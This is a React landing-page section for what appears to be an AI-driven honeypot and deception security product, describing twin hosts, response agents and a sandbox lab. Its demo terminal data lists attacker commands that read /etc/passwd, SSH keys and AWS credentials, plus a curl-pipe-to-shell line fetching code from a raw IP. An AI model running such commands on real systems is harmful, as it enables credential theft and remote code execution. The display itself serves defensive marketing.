"use client";

import { Brain, Cube, ShieldSlash, Flask } from "@phosphor-icons/react";
import { FeedList } from "@/components/shared/FeedList";
import { NetworkTopology } from "@/components/visualization/NetworkTopology";
import { cn } from "@/lib/utils";

const SESSION = [
  { id: "1", cmd: "whoami", out: "www-data" },
  { id: "2", cmd: "cat /etc/passwd | tail -n 3", out: "postgres:x:999:999::/var/lib/postgresql:/bin/bash" },
  { id: "3", cmd: "ls ~/.ssh", out: "id_rsa  id_rsa.pub  known_hosts" },
  { id: "4", cmd: "cat ~/.aws/credentials", out: "[default]\naws_access_key_id = AKIA2E4XQ7…", suspicious: true },
  { id: "5", cmd: "curl -s http://185.220.101.3/x | sh", out: "sh: 1: Syntax error: end of file unexpected", suspicious: true },
];

function Block({ icon: IconComponent, title, body, children, className = "" }: { icon: typeof Brain; title: string; body: string; children?: React.ReactNode; className?: string }) {
  return (
    <div className={`flex min-w-0 flex-col rounded-panel border bg-surface ${className}`}>
      <div className="flex flex-col gap-3 p-7">
        <IconComponent size={24} weight="duotone" className="text-accent" aria-hidden="true" />
        <h3 className="text-lg font-medium text-ink">{title}</h3>
        <p className="max-w-[48ch] text-base text-ink-muted">{body}</p>
      </div>
      {children}
    </div>
  );
}

export function Capabilities() {
  return (
    <section id="capabilities" className="scroll-mt-20 border-t bg-surface/40">
      <div className="mx-auto max-w-[1200px] px-6 py-[clamp(4rem,8vw,7rem)]">
        <h2 className="text-display max-w-[24ch] text-[clamp(1.75rem,3.2vw,2.5rem)] leading-[1.1] font-semibold tracking-[-0.015em] text-ink">
          Built to act while the analyst is still reading the alert
        </h2>

        <div className="mt-12 grid gap-4 md:grid-cols-[3fr_2fr]">
          <Block
            icon={Cube}
            title="Dynamic deception generation"
            body="Twins are provisioned in seconds and mirror the targeted host closely enough that the attacker keeps working."
          >
            <div className="h-64 border-t">
              <NetworkTopology interactive={false} />
            </div>
          </Block>
          <Block
            icon={Brain}
            title="Cognitive agents"
            body="A LangGraph state machine walks the MITRE ATT&CK kill chain and picks a proportional response, with the reasoning logged."
          />
        </div>
        <div className="mt-4 grid gap-4 md:grid-cols-[2fr_3fr]">
          <Block
            icon={ShieldSlash}
            title="Autonomous neutralization"
            body="Isolates the segment, nulls the ASN, or terminates the process. Never the whole cluster."
          />
          <Block
            icon={Flask}
            title="Sandbox lab"
            body="Run live-fire drills against the engine and watch the handoff from production to twin as it happens."
          >
            <div className="h-56 border-t">
              <FeedList
                items={SESSION}
                getKey={(s) => s.id}
                className="px-5 py-3"
                render={(s) => (
                  <div className="py-1">
                    <div className="flex gap-2">
                      <span className="shrink-0 text-success">www-data@honey-web-01:~$</span>
                      <span className={cn("min-w-0 break-all", s.suspicious ? "text-danger" : "text-ink")}>{s.cmd}</span>
                    </div>
                    <div className="pl-4 break-all whitespace-pre-wrap text-ink-muted">{s.out}</div>
                  </div>
                )}
              />
            </div>
          </Block>
        </div>
      </div>
    </section>
  );
}
